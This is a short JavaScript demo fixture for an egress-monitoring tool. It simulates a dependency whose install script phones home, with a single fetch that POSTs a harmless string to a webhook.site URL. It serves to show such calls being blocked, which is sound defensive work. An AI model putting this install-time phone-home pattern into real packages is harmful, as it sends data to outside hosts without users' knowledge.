// Demo fixture for egressmap: a dependency whose install script phones home.
// It only sends a harmless string. Run `npm install` under egressmap to watch it get blocked.
fetch('https://webhook.site/egressmap-demo', {method: 'POST', body: 'hello from an install script'}).catch(() => {});
